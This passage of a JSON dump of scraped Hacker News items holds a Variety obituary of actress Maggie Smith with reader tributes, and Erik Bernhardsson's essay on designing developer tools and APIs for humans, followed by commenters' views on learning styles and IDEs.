    "originBody": "Home Legit News Sep 27, 2024 6:23am PT Maggie Smith, Star of ‘Downton Abbey,’ ‘Harry Potter,’ Dies at 89 By Carmel Dagan, Alex Ritman Getty Images British stage and screen actress Maggie Smith, the “Downton Abbey” and “Harry Potter” star who numbers two Oscars, three Emmys and countless stage awards to her credit, died Friday in London. She was 89. “It is with great sadness we have to announce the death of Dame Maggie Smith,” her sons Toby Stephens and Chris Larkin said in a statement. “She passed away peacefully in hospital early this morning, Friday 27th September. An intensely private person, she was with friends and family at the end. She leaves two sons and five loving grandchildren who are devastated by the loss of their extraordinary mother and grandmother. We would like to take this opportunity to thank the wonderful staff at the Chelsea and Westminster Hospital for their care and unstinting kindness during her final days.” Related Stories VIP+ Generative AI Fueling ‘Exponential’ Rise in Celebrity NIL Rip-Offs: Exclusive Data Latin Grammy Nominations 2024: Edgar Barrera Leads List With 9, Followed by Karol G and Bad Bunny In her late 70s, Smith drew an entirely new legion of fans thanks to her starring role in the hugely successful series “Downton Abbey,” a hit for ITV, PBS’ “Masterpiece” and around the world. She picked up two Emmys and was nominated for two more for her role as the Dowager Countess. And like virtually every other British actor or actress, Smith appeared in a number of entries in the “Harry Potter” film franchise, playing Professor Minerva McGonagall. A master at classical and contemporary roles who was as renowned for her subtlety as for her broad-stroke mannerisms, the red-haired Smith delighted several generations of theatergoers on both sides of the Atlantic with signature performances in “Mary, Mary,” “Hedda Gabler,” “Othello,” “Private Lives,” “Night and Day” and “Lettice and Lovage,” and audiences around the world for her work in such films as “The Prime of Miss Jean Brodie,” “California Suite,” “A Room With a View,” “Travels With My Aunt,” “Hot Millions,” “A Private Function,” “Gosford Park,” “The Best Exotic Marigold Hotel” and its sequel. In 2015 she starred in “The Lady in the Van,” Alan Bennett’s adaptation of his play, based on his true experiences, and directed by Nicholas Hytner, who had helmed the play. In 1990, she was named Dame Commander of the British Empire, one of only a handful of her generation, including Judi Dench and Diana Rigg, to be so honored. A British reviewer once credited her with the “power to make you look and listen all the time, laconic and nervous, super in comedy, touching in pathos, a gem of an actress.” Even her detractors, who complained that her mannerisms — perpetually protruding elbows, flying hands, triple takes, swooping vocal inflections — marred some of her performances (particularly in long-running plays) could not dispute the impact of her theatrical energy. Annoyed by such complaints, she responded that it was better to do too much onstage than too little. Like other amazingly talented actors — Brando is one who springs to mind — the depth and breadth of her talent sometimes took her over the edge. But when she was on her game, she was unforgettable, deftly commanding the audience’s attention and stealing scenes from all those around her. Unlike other actors of her generation, Smith was not of the declamatory Laurence Olivier school of acting; she was seen as fresh and light-hearted. It turned out to be a mixed blessing: When young she had to convince others that she was a serious actress capable of holding her own with the classics. Margaret Smith was born in Ilford, Essex, and attended the Oxford School for Girls before studying theater at the Oxford Playhouse School. By 1952 she was appearing in Oxford U. stage productions, revues in particular, such as “On the Fringe,” with which she sometimes traveled. When “On the Fringe” reached the West End, American producer Leonard Sillman saw her and asked her to join the Broadway variety show “New Faces of 1956”; she was the only Brit. “New Faces” led to another comedic role in the revue “Share My Lettuce” in 1957 and a small film, “Nowhere to Go.” She returned to the stage in “The Stepmother” and then joined the Old Vic, where she began to establish her serious acting credentials in productions of “The Double Dealer,” “As You Like It,” “Richard II,” “The Merry Wives of Windsor” and “What Every Woman Knows.” In 1960, she co-starred for the first time with Olivier in Eugene Ionesco’s “Rhinoceros.” Then she appeared in “Strip the Willow,” Anouilh’s “The Rehearsal” and readings of Sean O’Casey’s “Pictures in the Hallway,” which would later lead to a role in the film “Young Cassidy,” with Rod Taylor as O’Casey. Smith’s first Evening Standard award came for Peter Shaffer’s “The Private Ear/The Public Eye.” Her next triumph was Jean Kerr’s “Mary, Mary.” Hollywood began to take notice of the actress at about this time: She held her own in a supporting role in the Richard Burton-Elizabeth Taylor vehicle “The V.I.P.s” in 1963 and was equally effective the following year in drama “The Pumpkin Eaters,” starring Anne Bancroft. Olivier then asked her to join his National Theatre Company as his Desdemona in “Othello,” which brought her theatrical acclaim and an Oscar nomination for the film version. For the National Theater, she racked up such productions as “The Recruiting Officer,” “The Master Builder,” a triumphant “Hay Fever,” “Much Ado About Nothing,” “Miss Julie,” “Black Comedy,” “A Bond Honoured” and an Ingmar Bergman-directed “Hedda Gabler,” which brought her another Evening Standard Award in 1970. She won the coveted title role in “The Prime of Miss Jean Brodie” over actresses who had performed it onstage such as Zoe Caldwell and Vanessa Redgrave and took home the Oscar for it. She was not at the ceremony but appearing in “The Beaux Strategem” in London at the time. During the period she also acted in films including “The Honey Pot,” “Hot Millions” and “Oh! What a Lovely War.” Joining the Stratford Festival in Ontario, Smith starred in “Antony and Cleopatra,” “The Way of the World,” “A Midsummer Night’s Dream” and “As You Like It,” among other productions. She also appeared in 1976 with Brian Bedford in “The Guardsman” in Los Angeles and returned to Broadway in Tom Stoppard’s “Night and Day,” which brought her a second Tony nomination (the first was for “Private Lives”). A second Oscar nomination came for George Cukor’s “Travels With My Aunt.” She was revealing in Neil Simon’s “California Suite,” so much so that she won a second Oscar, this time for supporting actress. Other film roles from the period included “Clash of the Titans,” “Quartet,” “Evil Under the Sun” and “Better Late Than Never.” But it wasn’t until the mid-’80s that she appeared in movies that matched her abilities: “A Private Function,” written by Alan Bennett, and “A Room With a View,” which brought her a fifth Oscar nomination. Both “A Private Function” and “The Lonely Passion of Judith Hearne,” which had its admirers, earned her BAFTA Awards for best actress. Onstage, even her most difficult assignments, like Jean Cocteau’s “The Infernal Machine,” were worth seeing. Her “Virginia” (as in Woolf) brought her another Evening Standard award in 1981 and “The Way of the World” yet another in 1984. Alan Bennett wrote the brilliant monologue “Bed Among the Lentils” for her, and she received acclaim when she performed it on television in 1988. Shaffer wrote “Lettice and Lovage” for her. This wonderful comedy was totally suited to her talents. She triumphed in London and then brought it to New York, where she finally won her Tony. It was at about this time that she was diagnosed with Graves’ disease, which compromised her health thereafter, curtailing her ability to work as frequently or for extended periods of time. Nonetheless, she racked up some impressive performances, particularly her award-winning “Three Tall Women,” written by Edward Albee, on the London stage in 1994. She appeared in several films including Steven Spielberg’s “Hook,” the mainstream hit “Sister Act” and its sequel, “The Secret Garden,” “The First Wives’ Club,” “Washington Square” and, impressively, the Ian McKellen fascist take on “Richard III.” She also appeared in the light-hearted “It All Came True” with Michael Caine and alongside Cher in “Tea With Mussolini.” On television she was unforgettable in “Memento Mori” and “Suddenly Last Summer” (which brought an Emmy nomination), along with appearances in telepics “All the King’s Men” (about a WWI tragedy) and “David Copperfield” (another Emmy nom). She earned an Emmy in 2003 for the HBO telepic “My House in Umbria,” was nominated again in 2010 for “Capturing Mary,” then earned two more for her regular role as Violet, Dowager Countess of Grantham, in the celebrated U.K. TV series “Downton Abbey.” In the 2000s, Smith made a solid impact in mainstream features with supporting roles in “Gosford Park,” “Divine Secrets of the Ya-Ya Sisterhood,” “Becoming Jane,” “Keeping Mum” and “Nanny McPhee Returns.” She was introduced to the masses of J.K. Rowling fans when she played Minerva McGonagall in the “Harry Potter” movie series. However, amid production of the “Potter” pics, Smith, at age 74, was diagnosed with breast cancer. She made a full recovery and returned to the big and small screen. Her work continued with a role in 2009’s “From Time to Time,” voicework in the 2011 animated pic “Gnomeo and Juliet,” as well as appearances in hit film “The Best Exotic Marigold Hotel” and its sequel. In 2012 Smith starred in the Dustin Hoffman-directed “Quartet,” Ronald Harwood’s adaptation of his own play about folks at a retirement home for opera singers, and she starred in “My Old Lady,” Israel Horovitz’s feature directorial debut based on his own play. Smith married actor Robert Stephens in 1967. After divorcing Stephens she married writer Beverly Cross in 1976; he died in 1998. She is survived by two sons, actors Christopher Larkin and Toby Stephens, and grandchildren. Read More About: Downton Abbey, Harry Potter, Maggie Smith Jump To Comments More from Variety After TikTok, Micro Dramas Could Be China’s Latest Disruptor to Global Entertainment What Lionsgate’s Partnership Deal With Runway Means Global Streamers Seeking Price Increases as Asia-Pacific Market Grows and Matures Cloud Adoption Key to Media Business Exploiting AI Loading comments...",
    "commentLink": "https://news.ycombinator.com/item?id=41670429",
    "commentBody": "Maggie Smith has died (variety.com)279 points by asix66 5 hours agohidepastfavorite29 comments jimbokun 4 hours agoMaggie Smith and Michelle Dockery were brilliant in Downton Abbey. Their characters always seemed two to three steps ahead of everyone with their wit. And were hilarious to boot. Robert Crawley was nominally in charge of everything. But it was clear that Violet and Mary were pulling all the strings through their understanding of how the social contracts really worked. And it was fitting that in the finale Violet hands over the future of the estate to Mary. reply astr0n0m3r 3 hours agoparentIn Downton Abbey, Maggie Smith is playing a toned-down version of the character she played in Gosford Park. reply kitd 7 minutes agorootparentWritten by the same person, so kind of expected. reply jimbokun 1 hour agorootparentprevWell maybe I'll have to watch that now. reply piltdownman 3 hours agoparentprevIf you haven't already make sure you watch Brideshead revisited. You have Phoebe Nicholls (who played Lady Rose's mother) and Diana Quick (Polina Molotova in The Death of Stalin and the Queen in the eponymous BBC series) doing some similar social machinations in the background of an absolutely stacked period-drama with a cast including Jeremy Irons, Laurence Olivier, and John Gielgud. reply dcuthbertson 1 hour agoprevShe was an absolutely wonderful actress. The Washington Post also has an article announcing her death [0]. It goes into a lot of depth about her work and who she was. [0]: https://www.washingtonpost.com/obituaries/2024/09/27/maggie-... reply piltdownman 4 hours agoprevA towering presence of British stage and screen, with Dame Judi Dench being about the last of that golden generation since the passing of Diana Riggs (Olenna Tyrell). Time for a rewatch of Gosford Park while archly sipping gin out of a china teacup with a raised pinkie. reply jszymborski 3 hours agoparentI didn't know Diana Riggs died :( She really brought the Queen of Thorns to life. reply piltdownman 3 hours agorootparentYeah she was a big loss, a 60s bond girl and all-round sex symbol who went on to completely transcend that label and developed into a serious thespian and RSC/Old Vic stalwart. She absolutely holds her own as the Wife of Olivier's Lear. I'm delighted she got to work with Edgar Wright before her death and put in a great turn in Last Night in Soho; I'd a big fear she'd peter out with a few Dr.Who episodes in a fairly unceremonious end to a glittering and exremely accomplished career. reply kitd 8 minutes agorootparentOne of her last roles was in the fantastic BBC comedy \"Detectorists\" where she played the mother of Rachael Stirling, her daughter in real life. There was definitely a big hole when series 2 came out without her. reply simonbarker87 2 hours agoprevFor her passing to make the front page of HN when she has no presence in the tech world really speaks to her impact. I imagine very few people would reach that level. Wonderful actress, she was the best character in Downton. reply jedberg 59 minutes agoparentThis is a really good point. Unless there is some tech angle these things don't usually make HN. I wonder how much of it has to do with the overlap between tech nerds and Harry Potter nerds. reply tsujamin 52 minutes agoparentprevDon’t forget The First Wives Club! RIP reply dmd 4 hours agoprevI saw a black cat this morning I'm pretty sure was her. reply alex1138 4 hours agoparentnext [–]I don't think you can understand the 1960s I think the same of \"The Graduate (1967)\" - https://www.youtube.com/watch?v=6cKafIqhEvk Note - this is not a movie she is in. reply whamlastxmas 3 hours agoparentprevLovely, thank you for sharing! reply vr46 3 hours agoprevExcellent on stage in A German Life, even when the writing wasn't up to her acting. And the Lady In The Van! RIP Maggie Smith reply gumboshoes 4 hours agoprevPeace to a good one. reply saucymew 3 hours agoprevMaggie Smith's character in both Abbey and HP brooked no BS. We're reaching the time now when more of the Harry Potter teachers are leaving this world, I am not looking forward to the students. reply ilrwbwrkhv 3 hours agoprev [–] One of the best artists of stage and cinema. Will miss her. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "British actress Maggie Smith, known for her roles in \"Downton Abbey\" and \"Harry Potter,\" passed away at 89 in London.",
      "Smith was a two-time Oscar and three-time Emmy winner, with a distinguished career in theater and film, earning numerous awards.",
      "She was made Dame Commander of the British Empire in 1990 and is survived by her two sons and five grandchildren."
    ],
    "commentSummary": [
      "Maggie Smith, renowned for her roles in \"Downton Abbey\" and \"Harry Potter,\" has passed away, prompting widespread tributes and reflections on her illustrious career.",
      "Her portrayal of witty and powerful characters, such as Violet Crawley in \"Downton Abbey,\" left a significant impact on audiences and the entertainment industry.",
      "The news of her death has resonated beyond the tech community, highlighting her influence and the admiration she garnered across various fields."
    ],
    "points": 279,
    "commentCount": 29,
    "retryCount": 0,
    "time": 1727444940
  },
  {
    "id": 41668304,
    "title": "It's hard to write code for computers, but it's harder to write code for humans",
    "originLink": "https://erikbern.com/2024/09/27/its-hard-to-write-code-for-humans.html",
    "originBody": "It's hard to write code for computers, but it's even harder to write code for humans 2024-09-27 Writing code for a computer is hard enough. You take something big and fuzzy, some large vague business outcome you want to achive. Then you break it down recursively and think about all the cases until you have clear logical statements a computer can follow. Computers are very good at following logical statements. Now, let's crank it up a notch. Let's try to write code for humans! I need to clarify what I mean. I'm talking about code that other humans will interact with. More specifically, I'm talking about the art of crafting joyful frameworks, libraries, APIs, SDKs, DSLs, embedded DSLs, or maybe even programming languages. Writing this code is much harder, because you're not just telling a computer what to do, you're also grappling with another user's mental model of your code. Now it's equal part computer science and psychology of reasoning, or something. How do you get that person to understand your code? Feynman famously said: Imagine how much harder physics would be if electrons had feelings. about something very different, but in a funny way I think this describes programming for humans a bit. The person interpreting your code actually has feelings! Let's talk about some ways we can make it easier. Getting started is the product It's obviously great to listen to your users and take their feedback into account. As it turns out, most of that feedback will come from power users who use your product all the time! How does that affect the distribution of the feedback you're getting? Will it be skewed? And what does this picture of an airplane have to do with it? Of course, there's a survivorship bias going on here. There are users who don't use your tool because they never get started. You will typically never hear their feedback! Consumer products have had growth hackers for many years optimizing every part of the onboarding funnel. Dev tools should do the same. Getting started shouldn't be an afterthought after you built the product. Getting started is the product! And I mean this to the point where I think it's worth restructuring your entire product to enable fast onboarding. Get rid of mandatory config. Make it absurdly easy to set up API tokens. Remove all the friction. Make it possible for users to use your product on their laptop in a couple of minutes, tops. You might dismiss this as, I don't know, “who cares about lazy users”. Then let me lean back on my bean bag chair, open a bag of Doritos, and explain something: There's currently 7,000,000,000 dev tools out there. Users don't have a ton of energy or patience to go deep and try to understand what's different about your LRU cache NPM package or whatever. Sorry! Humans learn from examples, not from “core concepts” Humans are amazing pattern matching machines, in contrast to computers who obey Boolean logic and follow strict instructions. It's common to see documentation for dev tools structured like a computer program. It starts with defines a core data model and the relations and the atoms. It starts with “core concepts” and how to configure and how to run things. Humans don't learn about things this way. Two seconds after writing the above paragraph, I ran into this on Twitter which basically captures what I'm trying to say: Too many programming books and tutorials are like “let’s build a house starting from scratch, brick by brick” when what I want to “here is a functioning house, let’s learn about it by changing something and then seeing what happens” — Chris Albon (@chrisalbon) September 5, 2024 Instead of writing an 5,000 word “core concepts” chronicle, may I suggest putting together a dozen examples instead. This has a few benefits: Humans will look at the examples and learn how your tool works from that. This is how humans learn! A person with a problem in mind will look for a starting point that's close enough. The more potential starting points, the more likely they are to have something that's closer to what they need. Falling into the pit of success The sad but true part of programming is, the default mode is that you're fixing an error of some sort. This means that users are going to spend the majority of the time with your tool trying to figure out what's not working. Which is why pushing them back into success is so core. A succinct list: Developers getting to success faster are happy developers. They will like your tool. Developers banging their heads against errors are sad developers. They will blame your tool. Think about every error as an opportunity to nudge a user towards the happy path. Put code snippets in the exceptions. Emit helpful warnings when users are likely to do something weird. Do what you got to do to make the user succeed. Avoid conceptual overload Every new conceptual thing you have to understand before using the tool makes is a new friction point. If it's 2-3 things, that's fine. But no one is going to bother learning 8 new concepts. This example (Kubernetes) isn't even particularly egregious. You can get started just knowing a few of these. I mean you can find worse ones out there It's probably true you don't need the vast majority to get started. But still, my head hurts when I have to learn new things. Too many things! There's something elegant about a framework with just 3-5 things that manages to be incredibly powerful. I remember the feeling when I tried React the first time and got over the conceptual hump after an hour or two. Just a few fairly simple building blocks that lets you build a whole cathedral. Magic stuff ✨. To be clear, the challenge isn't to reduce concepts. It's to retain the possible set of things you can build while reducing concepts. Or at least reducing the former less than the latter. I'm mentioning this because I picture some sort of a “dumb dev tools simplification doom loop” that goes something like this: I don't know if this is a thing, but my point here is that there's a level of futility of “bad” simplification. You ultimately want to push the frontier describing the tradeoff between “complexity” (what you need to know) and “ability” (what you can build). Amazing tools are able to reduce complexity by 90% while keeping the ability the same, But I'll also take a tool that reduces the former by 90% and reduces the latter by 10%. That's still not bad! Conceptual duck principle Somewhat related to the previous point, let's say in your framework you introduce a thing that takes some values and evalutes to a new values. What do you call it? A compute node? A valuator? A frobniscator? No! You call it a function! If it walks like a duck, and it quacks like a duck, it probably is a duck. Maybe it isn't exactly like a function in some subtle ways. Maybe the values are cached for instance. But that's close enough! Calling it a function means you latch onto a users pre-existing mental model of what a function does. Which will save you like, 90% of the explanation of how to think about this object. Programmability People will do crazy things with your codebase. They will take your things and put it inside a for-loop inside a function inside something else. People are creative! You want almost everything in your framework to be “programmable” for this reason. This is a whole class of issues that are related in subtle ways and can be solved in similar ways. Let users call things directly in code rather than going through a CLI. Avoid config and turn it into an SDK or an API. Make things easily to parametrize so you can create n things not just 1. One weird benefit of this is it often lets users discover new use cases for you. Harness people's desire to “hack” on top of your framework. There will be some mild bloodshed coming from those users, but don't chastise them! They might be on the verge of discovering something unexpected. Be extra judicious about magic, defaults, and syntactic sugar Let's say you're building a tool that executes a Jupyter notebook in the cloud. So you have a function run_notebook that takes a list of cells (with computer code) or something. How does the user specify which container image they should use? You have a few different options: An argument image=... that always has to be provided. An argument image=... that defaults to some base image with “most” data science libraries pre-installed, but that they user can override. You inspect the code in the cells and pick an image in a “magic” way based on what dependencies are needed. Same as above, but you also let users optionally specify a specific image. What should you use? If you want to minimize the amount of typing for users, while supporting the widest possible set of use cases, go for the last option. But here are some issues with all options except the first one: Let's be real — the magic will break in some % of situations. Users reading code that relies on defaults will not realize that things are customizeable. Unless defaults apply in 97%+ of the time, and unless magic applies 99% of the time, be careful about introducing it. These are not exact numbers obviously, but my point is, you need to be very very judicious. It's tempting to think that job as a tool provider is to minimize the amount of code a user has to write. But coding isn't golf! I think about this a bit about how I think about Perl vs Python. Perl tried very hard to optimize for shortest code until every program looked like a strong of special characters and nothing else. Then Python came and it's code was 50% longer. It never tried to be the shortest! But it turned out Python code was super readable and thus much more understandable. And people read code 10x more times than they write it. Syntactic sugar belongs in a similar category. It's tempting to introduce a special syntax for the most common use cases. But it often obscures the consistency and makes it less clear how to customize code. For similar reasons, unless the syntactic sugar applies 99%+ of the time, it's probably not a good idea to introduce it. Writing code for humans is hard We are coming to an end, but there are so many more things I could keep going on about: Most things (but not everything) should be immutable Avoid “scaffolding” (code generation) Make the feedback loops incredibly fast Make deprecations easy for users to deal with Use automated testing for code snippets in docs and examples Probably a lot more. Those are maybe things for a future blog post! Including what I think is maybe the most fascinating thing: why large companies are generally incapable of delivering great developer experiences. I sometimes think the challenge of designing for the 1st time user is similar to making a pop song. The producer will listen to the song a thousand times. But still the 999th time they hear it, they need to imagine what it sounds like to a person that hears it the first time, which seems… super hard. This is probably why I ended up building dev tools rather than producing pop songs. Tagged with: software, programming",
    "commentLink": "https://news.ycombinator.com/item?id=41668304",
    "commentBody": "It's hard to write code for computers, but it's harder to write code for humans (erikbern.com)264 points by imartin2k 9 hours agohidepastfavorite84 comments powersnail 2 hours agoPeople learn things differently. I really need the \"core concept\" first, before diving into examples, (unless the core concept is extremely simple). Many tutorials are like hand-holding Lego building. Here's your Lego pieces, watch me and follow me in building this toy project, and you'll know how to Lego at the end of the day. I just don't function very well in this model. I want to know how and why decisions are made. I want to see things from the author's perspective. I want to know how the Lego pieces each feels like, and how they connect to each other, and how you arrive at certain designs in a certain way. Trying to follow tutorials before at least some high-level, conceptual discussion, feels to me like I'm trying to reverse-engineer something that I shouldn't need to. Most of the time if I'm approaching a new library or framework, I read read the introduction texts, and skip the \"Getting started\" code samples. Usually, there's going to be some sort of \"Advanced\" section where a lot more talking and discussing of concepts happens, and that's what I'd like to dive into first. I'll go for the API references next, try to grasp what the important interfaces look like, and finally I'll get back to the basic code samples in the beginning of the tutorial. reply bramblerose 54 minutes agoparentI have the same (and ran into this trying to wrap my head around why Maven didn't work... I don't want a tutorial explaining how to get started, I need to understand the fundamentals to understand what's happening!). I think, however, that starting from the examples might help with good API design: if you design your API to be \"core concept first\", this will likely lead to an API that _can only be used after you understand the core concepts_, which is not great when people are only occasional users. reply hiAndrewQuinn 52 minutes agoparentprevI used to think I was a \"core concept\" kind of person, but later I realized I took that way too far and would refuse to do things outside of my comfort zone unless I felt like I truly understood everything ahead of time. Nowadays I'm much more likely to just jump in and start working with examples directly, and I feel much more productive. It's partly a thing of trust: I just trust that the makers of high quality software have put in enough thought to make their interfaces easy to understand, for the common use cases, without digging too deep into the internals. It frequently happens, of course, that I hit a roadblock where I do have to go deeper -- but that's only because there were 10 other things where I was successfully able to get by on surface impressions alone. So I find that even when I do dig in it's often time well spent. reply fsndz 10 minutes agoparentprevhow do you manage when the core concept are too abstract ? I guess then you would need some examples to understand ? reply brugidou 2 hours agoparentprevThis may be a cultural trait too. Erin Meyer in her \"Culture Map\" Book mentions this idea that every culture approach persuading others differently from theory-first to examples-first. reply rubslopes 2 hours agoparentprevI agree. Many coding courses start with setting up your environment, where to download the base packages... I much prefer the core concepts first. reply bbor 1 hour agoparentprevWell put, you beat me to it! Specifically this line started my disbelief: Humans don't learn about things this way. Naturally, as is the hacker way, with no citations. I’ve only scratched the surface of pedagogy, but it’s a massive and mature academy drawing its modern principles from the empirical psychology of Dewey and Piaget. There’s a LOT more to say about it than can be covered in a blog post, much less a subsection of a blog post! As you point out, the biggest issue is that people are different. The next biggest issue is we aren’t even sure why those differences occur, or how stable they are over time… Well written post otherwise and it’s a good dive into the pragmatics of a particular educational strategy — I just would ask to see more humility, I guess! reply austin-cheney 5 hours agoprevThere was an article similar to this less than 2 weeks ago: https://news.ycombinator.com/item?id=41566097 This whole issue of writing for people really distills down to two skills: 1. Empathy 2. Writing There is a world of difference between writing some code and writing an application, a product. That is all this article is about, though less explicitly. Empathy is a factor in this because its the difference between self-orientation and external-orientation. Self-orientated developers are primarily concerned with easiness, convenience, code vanity, and other subjectivity criteria. It comes down only to their effort of delivery. Externally-oriented developers are primarily concerned with architecture and documentation because for them success is all about how other people receive their work product. Simplicity is more important than easiness because externally-oriented developers know they cannot read minds and have no idea what other people find easy, but they do know how to reduce steps and keep their code small. In the brain writing an application, from a holistic product perspective, is no different than writing an essay, article, or book. Its all about organization and features. The code is something that comes later, like words on a page. For people who only write pieces of code they never develop the higher order organizational skills that brings it all together. It also works in the inverse in that if a person cannot write an essay with ease they cannot envision writing a new application. Those are the reasons I super detest frameworks. Frameworks deprive developers the practice necessary to write original software which means they are not developing those organizational skills. Its a massive gap that the inflicted cannot see, but is so enormously apparent to those that can see it. From a behavior perspective its no different than a learning or neurological disorder in that the inflicted know something is missing, but have no means to see what that something is, and that drives massive emotional insecurity. reply fsndz 5 minutes agoparentSo true, and this is a dilemma, right? People who build frameworks do so to make it easier for others to ship products. In the process of building the framework, they become better developers themselves. However, others now have to learn their abstractions, which distances them from the underlying concepts. This can make it harder for them to master the core skills needed to surpass the framework. I had that feeling when I learned Rails, only to realize it hid so much from me that I eventually had to drop it and try doing things from scratch. reply photonthug 4 hours agoprev> “Humans learn from examples, not from “core concepts” Nitpicking maybe but I disagree with tfa on this point; not all humans work this way. Those of us who might actually prefer the general -> specific direction are already largely ignored in k12 and may only begin to thrive in higher education. Since we’re already kind of underserved, there’s no need to also deny that we exist! reply masto 3 hours agoparentI'm with you on this. My learning style is to read the reference manual cover to cover (metaphorically now). I can recall numerous instances of wanting to get into a new thing and finding the vast majority of recommended introductions to be the polar opposite of what I was looking for. I'm going through this now as I decided to spend some time today learning the Drizzle ORM. The first things I found were all \"here are half a dozen examples of queries\", and I started getting frustrated: why are you using that syntax and not something else? What are the other options? I closed those and I'm much happier doing it my way: reading every page of the documentation before doing anything else. reply fsndz 3 minutes agorootparentI'm willing to bet that if you tried Rails, it probably wasn’t a good fit for you. reply photonthug 1 hour agorootparentprevQuery-language docs are a great example of this, especially proprietary ones. 3000 examples, many with blog post baggage and other distracting discussion, and when you try to find a description of the grammar, crickets. reply corytheboyd 4 hours agoparentprevI need both. Truly learning for me is learning core concepts, but examples are “known correct” cases I can test that understanding against. If something in the example is surprising, I know my model isn’t complete yet (or the example is wrong lol) reply layer8 4 hours agorootparentI also find “known incorrect” examples to be useful, for analogous reasons. But the worst is when there is no good and thorough description of the conceptual model and of how the concrete examples relate to it, because then the system remains a black box you can’t properly reason about, regardless of how many hands-on tutorials and cookbook examples you’ve seen. reply rustyminnow 1 hour agorootparentprevYes! Both are valuable, and sometimes you need to iterate between and within each. Like if the conceptual components are mutually recursive (A is defined in terms of B, B in terms of A (SOLR anybody?)), skimming the docs can give you a \"pencil sketch\" level model, examples can flesh out the relationships between components, and re-visiting the docs with extra context can provide a more precise model. reply bityard 4 hours agoparentprevMaybe I'm dimmer than the average techie, but I need both. Much of my current job is frustrating because it's a big company and every new task I encounter is presented with only an example of how the previous person did it. Instead of, \"This is what we're trying to achieve, this is how the thing works, this is how we do it,\" all that ever gets exposed to ICs is the \"this is how we do it\" part. This makes it impossible to reason about, adjust, and troubleshoot when even the slightest deviation is required. Yes, there is often SOME documentation tasks which are performed very often, but it's often outdated or incomplete. But it's not in a wiki, so not just anyone can updated at any time, there's a whole obnoxious process for updating the docs, which is why they never get updated. Now that I think of it, this reminds me quite a bit of my time in the military... reply layer8 4 hours agorootparentThe thing is that you can derive the “this is how to do it” from the first two, but not the other way around. While it’s very helpful to have all three, the first two are essential while the last one is not. reply tetha 2 hours agoparentprevThis is something I'm starting to pick up and use from a mentoring and onboarding perspective. By now, I fairly openly wonder if someone needs conceptual or architectural clarification, technique on handling a thing, or a solution right there. And when we should have a follow-up call in the first two cases. And having both thoughts and material available for a specific -> general, as well as a general -> specific path around is very good, because in more complex topics, it helps to be able to do both. Let them get a grip on some concrete things, then bring in the abstract ideas. Or let them learn the abstract concepts and show them how they can do concrete things with it. reply photonthug 2 hours agorootparentHopefully some teachers are actively looking for which approach students need, like you are. I always found the focus on say audio vs visual learning styles to be strange because for me, abstract vs concrete is much more important. Showing a collection of examples to illustrate an abstraction is fundamentally kind of bizarre to me, especially when the abstraction is short and easy to state. Because really, the concrete examples might have many things in common and I won’t be sure which ones the teacher wishes to indicate. This problem is more obvious with math/code maybe, but I see the same issues with teaching / learning things like philosophy and history. Examples very often just obscure the lesson for me, especially when they come first. Just hit me with the abstraction and generalities first so I can orient, then I can understand which part of the concrete examples I’m supposed to consider. reply marcosdumay 2 hours agoparentprevPeople are really consistent on needing both of those. And practice, and studying again after practice. How much of those things they need varies from person to person, but they always need all of them. reply bigstrat2003 2 hours agoparentprevThis also stood out to me as obviously wrong in the article. Since time immemorial, we have taught math by teaching the core concepts and building on them incrementally. Since people do successfully learn how to do math, this directly disproves the author's claim that people don't learn that way. reply vbezhenar 4 hours agoparentprevYeah, it might be me. I learned microcontrollers by learning assembly, gdb, as, ld, then gradually switched to C, wrote my own \"library\", then slowly learned about vendor library and gradually replaced by code with proper approach. Can't imagine learning this stuff from the vendor code examples. I wouldn't understand a thing. This approach works for me, but only when documentation is extensive. When vendor suggests \"copy this example and tinker with code until it works the way you want\", this approach just throws me off and I absolutely lose any will to learn. Examples are very important, but not as starting point. reply golergka 3 hours agoparentprevI recently learned to ride with a stick, on a trip with my girlfriend and her dad. My gf just told me what to do, when to press the clutch and when to let go of it. This didn't help me at all; I didn't understand the nuances of what to do when, which things to do completely simultaneously and which to one just right after another. And then her dad chimed in, briefly explaining to me what the clutch actually does, and how does the connection between wheels and engine affect both of them. I instantly got it and didn't have to even hear instructions what to do in any particular situation. About 20 minutes later I was able to drive a car from a hand brake on a backwards slope, which is supposed to be one of the hardest things to do with a stick. Understanding how something works from first principles is much more useful for some people, and I think that there's a lot of \"some people\" among the software engineers. reply CharlieDigital 4 hours agoprevFrom Code Complete: “The smaller part of the job of programming is writing a program so that the computer can read it; the larger part is writing it so that other humans can read it.” (P.733) Has stayed with me for ~20 years. reply zelphirkalt 2 hours agoparentOr from Abelson (one of the SICP authors) similar, approximately: Code should be written for humans to understand and only lastly for computers to understand. reply dbalatero 3 hours agoparentprevI wish that wasn't buried on page 733! reply CharlieDigital 1 hour agorootparentThe whole books has some good nuggets but it definitely makes you work for it :) reply animal531 7 hours agoprevBit of a side issue for me: I was working on my Unity game the other day and thought to myself, have IDE's really not progressed all that much in the last 10-20 years? Default intellisense has definitely gotten a lot better, but apart from that and a few other minor things the whole concept of coding feels pretty much the same today as back then. The biggest positive change for me is outside of the editor, it has become easier thanks to much more access to libraries, documentation and just the sheer volume of user questions and answer sets we now have access to (and finally some new tools like ChatGPT that can aggregate those answers to on occasion deliver a reasonable answer). But overall the act of writing code seems to be stuck. As a result I'm currently taking some time out from my game to run some experiments. I don't want to create a new language, but instead I want to try and offload everything I can to the computer, let it do the drudge work while allowing me to create. Just 3 of the initial things I want to test: - Why do I need to worry about small language specifics like brackets, terminators and so on when tools should be able to auto-complete them for me? What about the private-public access chain (as well as other modifiers such as unsafe) when tools can auto-determine the most efficient set? - You're editing a file (or parts of different files) and are focusing on say 5 methods that are interacting. I want to see all of them on the screen at the same time, without having to struggle to open and manage many windows with for example VS horizontal/vertical sliders. - Data conversion. So I created a HashSet for something but realize I need to change it to a Dictionary or a Tuple, just make it happen. If it requires brainwork then show me all the places that requires supervision where I have to say ok or make an edit myself. In the case of Unity I also want to be able to click on a method and/or data set and tell it to convert it to a Burst Job with its accompanying NativeData sets. reply skydhash 5 hours agoparent> The whole concept of coding feels pretty much the same today as back then. The whole concept of programming languages has not changed that much. We have the two big pillars that is the Turing Machine and Lambda Calculus (and various others) Everything after that has been abstractions, and when the abstractions are good, we call them paradigms. But it's all abstractions, and ultimately we are just writing instructions for a really dumb machine to compute data for us. > Why do I need to worry about small language specifics like brackets, terminators and so on when tools should be able to auto-complete them for me? Because the computer is something really simple, and the programming language is just a idea conduit from your mind. Those delimiters are as important as the language keywords, because they are part of the RULES. Auto-completing them will require more RULES and more delimiters. > You're editing a file (or parts of different files) and are focusing on say 5 methods that are interacting. I want to see all of them on the 